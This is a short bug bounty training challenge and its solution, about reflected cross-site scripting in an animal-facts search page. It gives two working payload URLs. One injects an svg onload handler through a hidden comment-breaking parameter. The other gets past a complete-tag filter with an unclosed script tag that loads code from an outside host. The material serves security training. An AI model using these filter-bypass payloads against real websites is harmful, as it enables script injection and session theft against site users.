## Can you find any XSS? No HTML tags allowed!

This is a simple web application designed to show you some interesting facts on various animals. I've made sure that the search field does NOT allow for HTML tags, but is it secure?

How many XSS vulnerabilities can you find?

Solution 
If no query is provided (?query=) then an error is shown. If you view the source, you will notice: <!-- p0 -->. This only appears when there is no query and it should signal to the hunter that it may do something interesting. Trying it as a parameter will show it is vulnerable to basic XSS.

First XSS: https://www.bugbountytraining.com/challenges/challenge-1.php?query=&p=--><svg/onload=alert(0)>

There is also another XSS when searching for an invalid animal, such as wildbeast. The query is reflected back and from a quick test using <h2> you will see HTML is reflected. For example, try search for test<h2>test1.

However, you will soon quickly find that malicious tags are stripped and so are on{} event handlers. However, the code only checks for complete HTML tags, therefore you can bypass it with the following:

Second XSS: https://www.bugbountytraining.com/challenges/challenge-1.php?query=<script src=//yoursite.com/js.js?c=